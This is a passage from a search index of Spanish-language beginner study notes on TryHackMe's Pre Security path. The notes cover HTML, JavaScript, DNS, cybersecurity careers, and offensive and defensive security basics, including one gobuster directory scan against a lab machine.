    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/2. HTML.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "Las páginas web son creadas, principalmente, usando:\n\n- HTML, para construir webs y definir su estructura.\n- CSS, para hacer que las webs se vean bonitas añadiendo opciones de estilos.\n- JavaScript, implementa funciones complejas usando la interactividad.\n\nHyperText Markup Language (HTML) es el lenguaje en el que se escriben las páginas. Los elemenos o etiquetas (tags) son los bloques que construyen las páginas. Un código sencillo:\n\n```html\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<title>Page Title</title>\n\t</head>\n\t<body>\n\t\t<h1>Ejemplo de Cabecera</h1>\n\t\t<p>Ejemplo de párrafo.</p>\n\t</body>\n</html>\n```\n\nLa estructura HTML consta de los siguientes componentes:\n\n- El encabezado `<!DOCTYPE html>` indica que la página es un documento html5.\n- La etiqueta `<html>` es el elemento raíz de la página HTML.\n- La etiqueta `<head>` contiene información sobre la página, como el título.\n- La etiqueta `<body>` define el cuerpo principal ldel documento HTML. Sólo lo que está dentro del cuerpo se muestra en el buscador.\n- La etiqueta `<h1>` es el encabezado más grande. Existen hasta el `<h6>`.\n- La etiqueta `<p>` define un párrafo.\n- Hay más elementos para diferentes finalidades como `<button>`, `<img>` o `<form>`.\n\nLas etiquetas contienen atributos como *class* que sirve para cambiar el color por ejemplo `<p class=\"bold-text\">` o el atributo *src* para especificar localización del enlace (usado en fotos) `img src=\"img/cat.jpg\">`. Un elemento puede tener varios atributos: `<p atributo1=\"valor1\" atributo2=\"valor2\">`.\n\nLos elementos también pueden tener un atributo id `<p id=\"ejemplo\">`, el cual es único para cada elemento. Al contrario que el atributo clase, el cual puede pertenecer el mismo a varios elementos. Estos id's son usados para los estilos y para que JavaScript identifique los elementos.\n\n"
  },
  {
    "title": "5. HTML Injection",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/5-html-injection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/5. HTML Injection.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "Es una vulnerabilidad que ocurre cuando el input de un usuario no filtrado se muestra en la web. Si un sitio falla al sanitizar el input de un usuario, y ese input es usado en la página web, entonces el usuario puede inyectar código HTML.\n\nCuando un usuario tiene el control sobre cómo su input se enseña, puede subir HTML o JS y el buscador lo usará en la página, pudiendo cambiar así la apariencia y funcionalidad.\n\n![[021.png]]\n\nLa imagen de arriba muestra cómo una form se outputea en la web. Cualquier cosa que el usuario introduce se usa en la función sayHi.\n\nLa regla general es nunca fiarse del input del usuario. Además sanitizar los inputs antes de meterlo en una función."
  },
  {
    "title": "3. JavaScript",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/3-javascript/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/3. JavaScript.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "JavaScript es uno de los lenguajes de programación más famosos en el mundo y permite a las páginas ser interactivas. HTML es usado para crear la estructura y el contenido de las páginas, mientras que JS es usado para controlar la funcionalidad de las páginas web. Sin JS, una página no podría tener elementos interactivos y siempre sería estática. JS actualiza la página en tiempo real lo que significa que se puede modificar el HTML en eventos concretos, como pulsar algún botón o rellenar un formulario.\n\nJS es añadido a la página en el código fuente y puede estar incluido bien dentro de la etiqueta `<script></script>` o bien de manera remota desde otro documento usando el atributo *src*: `<script src=\"/location/of/javascript_file.js\"></script>`.\n\nEl siguiente código JS encuentra un elemento HTML en la página con id *\"demo\"* y cambia el contenido del elemento a *\"Hack the Planet\"*:\n\n```js\ndocument.getElementById(\"demo\").innerHTML = \"Hack the Planet\"\n```\n\nLos elementos HTML también pueden tener eventos como *\"onclick\"* u *\"onhover\"* que ejecutan el JS cuando ocurre el evento. El siguiente código cambia el texto en el elemento con id *\"demo\"* a un botón:\n\n```js\n<button onclick='document.getElementById(\"demo\").innerHTML = \"Button Clicked\";'>Click Me!</button>\n```\n\n"
  },
  {
    "title": "1. How websites work",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/1-how-websites-work/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/1. How websites work.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "Cuando visitamos una página web, el servidor hace una petición al servidor web preguntando por información de la página que estamos visitando. Este responderá con la información que el buscador usa para mostrarte la página. Un servidor web es un ordenador dedicado que maneja tus peticiones.\n![[018.png]]\nHay dos componentes principales que forman un sitio web:\n\n- Front End (Client-Side): La forma en la que un buscador renderiza el sitio web.\n- Back End (Server-Side): Un servidor que procesa tu petición y devuelve una respuesta.\n\nHay muchos procesos que toman parte en tu buscador haciendo una petición al servidor."
  },
  {
    "title": "4. Sensitive Data Exposure",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/4-sensitive-data-exposure/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/4. Sensitive Data Exposure.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "La exposición de información sensible ocurre cuando un sitio web no proteje (o elimina) correctamente la información sensible en texto claro.\n\nAhora sabemos que la páginas web están construidas usando varias etiquetas que podemos ver buscando en el código fuente. Es posible que un desarrollador web se haya olvidado de eliminar credenciales o links privados.\n\nLa información sensible puede ser usada por el atacante para llevar el ataque más allá en la aplicación web. Al rematar el trabajo de desarrollo de una web lo primero que hay que hacer es revisar el código fuente.\n\n1. ![[020.png]]\n2. ![[019.png]]\n"
  },
  {
    "title": "0. How Websites Work",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/0-how-websites-work/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "[[1. How websites work]]\n[[2. HTML]]\n[[3. JavaScript]]\n[[4. Sensitive Data Exposure]]\n[[5. HTML Injection]]\n"
  },
  {
    "title": "2. Domain Hierarchy",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/2-domain-hierarchy/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/2. Domain Hierarchy.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "\n![[008.png]]\n<h2>Top Level Domain</h2>\nUn TLD es la parte de más a la derecha de un dominio. En tryhackme sería *\".com\"*. Hay dos tipos de TLD:\n\n1. gTLD: Generic TLD.\n2. ccTLD: Country Code TLD.\n\nHistóricamente, un gTLD pretendía decirle al usuario el uso del sitio, por ejemplo, .org para organizaciones, .gov para páginas del gobierno, .edu para educación... y los ccTLD se usaban con propósitos geográficos.\n\n<h2>Second Level Domain</h2>\nTomando tryhackme.com como ejemplo, el .com es el TLD y tryhackme es el SLD. Al registrar el SLD hay un límite de 63 caracteres y sólo se pueden usar caracteres a-z, 0-9 y guiones (no se puede empezar ni acabar con los guiones o tener dos guiones consecutivos).\n\n<h2>Subdomain</h2>\nUn subdominio descansa en la parte izquierda del SLD usando un punto para separarlo, por ejemplo en el nombre admin.tryhackme.com, la parte admin es el subdominio. Tiene las mismas restricciones de creación que un SLD. Puedes usar varios subdominios separados por puntos para crear nombres más largos como jupiter.servers.tryhackme.com. Pero la longitud debe ser menor o igual a 253 caracteres. No hay límite para el número de subdominios que puedes crear para tu dominio."
  },
  {
    "title": "0. DNS in Detail",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/0-dns-in-detail/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/0. DNS in Detail.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "[[1. What is DNS_]]\n[[2. Domain Hierarchy]]\n[[3. Record Types]]\n[[4. Making a Request]]\n[[5. Práctica]]\n"
  },
  {
    "title": "4. Making a Request",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/4-making-a-request/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/4. Making a Request.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": ">¿Qué ocurre cuando hacemos una petición DNS?\n\n1. Cuando pedimos el nombre de dominio, el ordenador primero comprueba la caché local. Si no está ahí (no se ha usado recientemente) se hace una petición a tu Servidor DNS Recursivo.\n2. Un servidor DNS recursivo es normalmente dado por tu ISP pero también puedes escoger el tuyo. Este servidor también tienen una caché del mismo estilo. Si la respuesta se encuentra se manda de vuelta casi instantaaneamente. Si no, una búsqueda comienza, empezando por los servidores root de DNS.\n![[009.png]]\n3. Los servidores root DNS actuan como el esqueleto de internet. Su trabajo es redirigirte al TLD correcto. Para la petición www.tryhackme.com, el root server DNS identificará .com y lo mandará al servidor en el que lidia con ese TLD.\n4. Un sesrvidor TLD tiene actas de dónde encontrar el servidor autorizado para responder la petición DNS. Este servidor autorizado también se conoce como mnameserver para el dominio. El de tryhackme.com es kip.ns.cloudfare.com y uma.ns.cloudfare.com.\n5. Un servidor autorizado es el servidor responsable de guardar los records DNS para un dominio particular. Dependiendo del tipo de record, se manda de vuelta al servidor recursivo donde una copia local se almacena en la caché. Todos los records DNS vienen con un valor TTL (Time To Live). Este número indica, en segundos, el tiempo que debería guardarse localmente hasta volver a mirarlo."
  },
  {
    "title": "1. What is DNS_",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/1-what-is-dns_/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/1. What is DNS_.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "Domain Name System (DNS) nos da una forma de comunicarnos con dispositivos en internet si necesidad de recurdar su IP. En lugar de recordar la IP, podemos recordar el dominio, más fácilmente.\n\n"
  },
  {
    "title": "3. Record Types",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/3-record-types/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/3. Record Types.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "DNS no es sólo para las webs y hay muchos tipos de record DNS.\n\n<h2>A Record</h2>\nEstos records resuelven a direcciones IPv4, por ejemplo 104.26.10.229\n<h2>AAAA Record</h2>\nEstos records resuelven las direcciones IPv6, por ejemplo 2606:4700:20::681a:be5\n<h2>CNAME Record</h2>\nEstos records resuelven el nombre de dominio. Por ejemplo, la tienda online de TryHackMe tiene el subdominio store.tryhackme.com, lo que devuelve un CNAME record shops.shopify.com. Otra consulta DNS se realizaría a shops.shopify.com para intentar saber la dirección IP del sitio web.\n<h2>MX Record</h2>\nEstos resuelven a la dirección de los servidores que manejan el email para el dominio solicitado. Por ejemplo, un record MX para tryhackme.com sería algo como alt1.aspmx.l.google.com. Estos records también vienen con una flag de prioridad. Esto le dice al cliente en qué order probar los servidores, perfecto para cuando un servidor se cae y hace falta mandar un email a un servidor de backup.\n<h2>TXT Record</h2>\nSon records donde cualquier información basada en texto puede ser guardada. Tienen múltiples usos pero algunos de los más comunes son:\n\n- Listar servidores que tienen la autoridad oara mandar un email en nombre del dominio.\n- Verificar la tenencia del dominio desde servidores de terceros.\n"
  },
  {
    "title": "5. Práctica",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/5-practica/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/5. Práctica.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "1. ![[012.png]]\n2. ![[010.png]]\n3. Diferentes parámetros para buscar diferentes cosas.\n\n\n\n\n\n\n\n\n"
  },
  {
    "title": "2. Analista de seguridad",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/2-analista-de-seguridad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/2. Analista de seguridad.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Responsable de mantener la seguridad de la información de la organización.*\n\nSon necesarios para construir las medidas de seguridad a lo largo de las organizaciones para proteger a las compañías de ataques.\n\n-----------------------\n<h2>Responsabilidades</h2>\n- Trabajar con varios interesados para analizar la ciberseguridad.\n- Compilar reportes sobre la seguridad de las redes, documentar problemas de seguridad y tomar medidas en respuesta.\n- Desarrollar planes de seguridad.\n\n-------------------------\n<h2>Learning Paths</h2>\n- Pre Security\n- Cyber Security 101\n- SOC Level 1"
  },
  {
    "title": "4. Respondedor de Incidentes",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/4-respondedor-de-incidentes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/4. Respondedor de Incidentes.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Identifica y mitiga ataques mientras las operaciones de los atacantes son llevadas a cabo.*\n\nResponden de manera productiva y eficiente a las brechas de ciberseguridad. A menudo se trata de una posición muy presionada.\n\n------------------------\n<h2>Responsabilidades</h2>\n- Desarrollar y adoptar un plan de respuesta a incidentes exhaustivo y accionable.\n- Mantener las mejores prácticas de seguridad sólidas y respaldar las medidas de respuesta a incidentes.\n- Informes posteriores a incidentes y preparación para futuros ataques, teniendo en cuenta los aprendizajes y adaptaciones que se deben extraer de los incidentes.\n\n----------------------------\n<h2>Learning Path</h2>\n- SOC Level 1"
  },
  {
    "title": "0. Careers in Cyber",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/0-careers-in-cyber/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": "[[1. Introducción]]\n[[2. Analista de seguridad]]\n[[3. Ingeniero de seguridad]]\n[[4. Respondedor de Incidentes]]\n[[5. Examinador Forense Digital]]\n[[6. Analista de Malware]]\n[[7. Penetration Tester]]\n[[8. Red Teamer]]\n"
  },
  {
    "title": "6. Analista de Malware",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/6-analista-de-malware/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/6. Analista de Malware.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Analiza el tipo de malware para aprender más sobre cómo funcionan y lo que hacen.*\n\nEl trabajo de un analista de malware envuelve analizar programas sospechosos, descubrir lo que hacen y escribir reportes sobre sus hallazgos.\n\n-----------------------------\n<h2>Responsabilidades</h2>\n- Llevar a cabo análisis estáticos de programas maliciosos, lo que implica ingeniería inversa\n- Realizar análisis dinámicos de muestras de malware mediante la observación de sus actividades en un entorno controlado\n- Documentar e informar de todos los hallazgos"
  },
  {
    "title": "8. Red Teamer",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/8-red-teamer/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/8. Red Teamer.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Juega el rol de un adversario, atacando una organización y proveyendo feedback desde la perspectiva enemiga.*\n\nComparten similitudes con los pentesters pero con un rol laboral más específico. Requiere emular las acciones de los ciberdelincuentes incluso si estas no son siempre cibernéticas.\n\n---------------------\n<h2>Responsabilidades</h2>\n- Emule el papel de un actor de amenazas para descubrir vulnerabilidades explotables, mantener el acceso y evitar la detección\n- Evalúe los controles de seguridad, la inteligencia de amenazas y los procedimientos de respuesta a incidentes de las organizaciones\n- Evalúe e informe sobre la información, con datos procesables para que las empresas eviten instancias del mundo real\n\n-------------\n<h2>Learning Path</h2>\n- JR Penetration Tester\n- Offensive Pentesting\n- Red Teamer"
  },
  {
    "title": "5. Examinador Forense Digital",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/5-examinador-forense-digital/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/5. Examinador Forense Digital.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Responsable de usar la forénsica digital para investigar incidentes y crímenes.*\n\nSi te gusta jugar a ser detective, puede que este sea tu trabajo perfecto. Metiendo a los criminales entre rejas y absolviendo a los inocentes.\n\n-----------------------------\n<h2>Responsabilidades</h2>\n- Recopile evidencia digital mientras observa los procedimientos legales\n- Analizar la evidencia digital para encontrar respuestas relacionadas con el caso\n- Documente sus hallazgos e informe sobre el caso"
  },
  {
    "title": "7. Penetration Tester",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/7-penetration-tester/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/7. Penetration Tester.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Responsable de testear productos tecnológicos en busca de agujeros de seguridad.*\n\nSu trabajo es probar la seguridad de las redes y el software de una compañía.\n\n------------------\n<h2>Reponsabilidades</h2>\n- Realizar pruebas en sistemas informáticos, redes y aplicaciones basadas en la web\n- Realizar evaluaciones de seguridad, auditorías y analizar políticas\n- Evalúe e informe sobre la información, recomendando acciones para la prevención de ataques\n\n----------------------------\n<h2>Learning Path</h2>\n- JR Penetration Tester\n- Offensive Pentesting"
  },
  {
    "title": "1. Introducción",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/1-introduccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/1. Introducción.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": "Las carreras en ciberseguridad se están haciendo populares y siendo cada vez más demandadas por los siguientes motivos:\n- Salario alto.\n- Excitante.\n- Altamente demandado.\n"
  },
  {
    "title": "3. Ingeniero de seguridad",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/3-ingeniero-de-seguridad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/3. Ingeniero de seguridad.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Diseña, monitoriza y mantiene los controles de seguridad, redes y sistemas para ayudar a prevenir ciberataques.*\n\nLos ingenieros de seguridad desarrollan e implementan las soluciones de seguridad utilizando datos de amenazas y vulnerabilidades, procedentes de miembros del personal habitualmente.\n\n------------------------\n<h2>Responsabilidades</h2>\n- Probar y examinar las medidas de seguridad en todo el software\n- Supervise las redes y los informes para actualizar los sistemas y mitigar las vulnerabilidades\n- Identifique e implemente los sistemas necesarios para una seguridad óptima\n\n-----------------------------\n<h2>Learning Path</h2>\n- SOC Level 1\n- JR Penetration Tester\n- Offensive Pentesting"
  },
  {
    "title": "1. What is Offensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/1-what-is-offensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/1. What is Offensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "><em>\"Para vencer a un hacker necesitas pensar como él\"</em>\n\nA continuación una guía para hackear nuestra primera web en un entorno seguro y legal.\nAunque antes debemos responder:\n\n1. Cuál de las siguientes opciones representa mejor el proceso donde simulas ser un hacker para encontrar vulnerabilidades en un sistema?\n>Seguridad Ofensiva\n\n\n\n"
  },
  {
    "title": "0. Offensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/0-offensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "[[1. What is Offensive Security]]\n[[2. Hacking my first machine]]\n[[3. Careers in Cyber Security]]\n"
  },
  {
    "title": "2. Hacking my first machine",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/2-hacking-my-first-machine/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/2. Hacking my first machine.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "En esta *room* se ha creado una máquina virtual llamada **Fakebank**.\n\n1. ![[Pasted image 20250410141122.png]]\n2. ![[Pasted image 20250410142116.png]]Con el comando siguiente:\n\t\n```bash\ngobuster -u http://fakebank.thm -w Desktop/wordlist.txt dir\n```\n\t1. -u: Indicamos la URL.\n\t2. -w: Indicamos el diccionario\n\t3. dir: Le especificamos que busque directorios.\n\n3. ![[Pasted image 20250410142253.png]]"
  },
  {
    "title": "3. Careers in Cyber Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/3-careers-in-cyber-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/3. Careers in Cyber Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "Para aprender ciberseguridad de manera correcta es importante romperlo en pasos más sencillos. Construir un hábito todos los días suele ser una muy buena manera de progresar.\n\nHay tres ramas principales a la hora de trabajar de nuestra profesión:\n1. Penetration Tester: Responsable de poner a prueba la tecnología y productos y encontrar vulnerabilidades explotables.\n2. Red Teamer: Juega el rol de un adversario que ataca la organización y provee feedback.\n3. Security Engineer: Diseña, monitoriza y mantiene controles de seguridad, redes y sistemas para prevenir los ciberataques."
  },
  {
    "title": "0. Deffensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/0-deffensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/0. Deffensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "[[1. Introduction to Defensive Security]]\n[[2. Areas of Defensive Security]]\n[[3. Practical Example of Defensive Security]]\n"
  },
  {
    "title": "1. Introduction to Defensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/1-introduction-to-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/1. Introduction to Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "En la página anterior aprendimos sobre [[1. What is Offensive Security]]. En esta lección nos adentraremos un poco en la seguridad defensiva, la cual trata de:\n1. Prevenir intrusiones.\n2. Detectar intrusiones cuando ocurren y responder acorde.\n\nAlgunas de las tareas que realizan estos equipos son:\n1. Concienciación de ciberseguridad a los usuarios.\n2. Documentar y manejar los sistemas/dispositivos.\n3. Actualizar y parchear sistemas.\n4. Configurar dispositivos de seguridad.\n5. Configurar dispositivos de monitorización.\n\nA parte de lo que cubriremos con estas, también hay otras ramas ([[2. Areas of Defensive Security]]) como:\n1. Security Operations Center (SOC).\n2. Threat Intelligence.\n3. Digital Forensics and Incident Response (DFIR).\n4. Malware Analysis."
  },
  {
    "title": "2. Areas of Defensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/2-areas-of-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/2. Areas of Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "<h2>Security Operations Center (SOC)</h2>\nEs un equipo de profesionales de la ciberseguridad que monitorea la red y los sistemas para detectar eventos maliciosos. Algunas áreas de interés para los SOC son:\n- **Vulnerabilidades**: Esencial instalar el adecuado parche o actualización inmediatamente después de detectarla.\n- **Violación de Políticas**: Cuando se infringen el conjunto de reglas de seguridad en un sistema, por ejemplo, los usuarios del sistema comparten información privilegiada con agentes externos.\n- **Actividad no Autorizada**: Por ejemplo cuando las credenciales de un usuario son robadas. Se debe proceder a bloquear la intrusión de esa cuenta de inmediato.\n- **Intrusiones en la red**: Por muy buena que sea tu seguridad siempre hay una posibilidad de ser vulnerado. En esos momentos hay que actuar rápida y diligentemente.\n\n---------------------------------\n<h2>Threat Intelligence</h2>\n\nEn este contexto, inteligencia se refiere a la información que eres capaz de recolectar sobre amenazas/enemigos actuales y potenciales. Threat Intelligence ayuda a la empresa a prepararse mejor de cara a potenciales adversarios. Hay diferentes tipos de amenaza dependiendo de la empresa víctima. Por ejemplo podrían intentar **robar** datos de una compañía de teléfonos o **parar** la refinación de petróleo en una planta.\n\nPara esto necesitamos recolectar datos. Estos datos son recogidos de redes locales, logs de red y recursos públicos como foros. El procesamiento de datos los ordena en un formato analizable. La parte de análisis busca obtener más información sobre los atacantes/adversarios, sus técnicas, tácticas y procedimientos.\n\n------------------------------\n<h2>Digital Forensics</h2>\nEs la aplicación de la ciencia a la investigación de crímenes. Con la expansión de la tecnología una nueva ciencia forense se alzó: Computer Forensics, que terminó siendo Digital Forensics. La misión principal es analizar evidencia de los crímenes y a sus perpetradores. \n\nPara ello nos centramos en:\n\n- File System: Analizando una copia a bajo nivel del sistema de archivos.\n- System Memory: Analizando la memoria del sistema a bajo nivel (copia).\n- System Logs: Analizando los logs del sistema.\n- Network Logs: Analizando los logs de la red y los paquetes enviados y recibidos.\n\n-------------------------------------------\n<h2>Incident Response</h2>\nUn incidente normalmente se refiere a una brecha de seguridad o una filtración de información o ciberataque. De todas maneras, puede ser algo poco crítico como una mal configuración, un intento de intrusión, etc. \n\nLas cuatro fases de la respuesta ante incidentes son:\n\n1. Preparación: Requiere de un equipo entrenada listo para responder ante estos.\n2. Detección y análisis: El equipo tiene los recursos y herramientas necesarios para poder detectarlo a tiempo.\n3. Contención, erradicación y recuperación: Una vez detectado hay que erradicarlo o en su defecto contenerlo. Además si es posible se debe intentar recuperar los datos.\n4. Actividad post-incidente: Después de una intrusión exitosa o no un informe debe de ser redactado.\n\n------------------------------\n<h2>Malware Analysis</h2>\nMalware significa Malicious Software. Son programas, documentos o archivos diseñados específicamente para infectar equipos. Para aprender sobre ellos usan:\n\n- Análisis estático: Miran el código sin ejecutarlo.\n- Análisis dinámico: Ejecutan el código en entornos controlados."
  },
  {
    "title": "3. Practical Example of Defensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/3-practical-example-of-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/3. Practical Example of Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
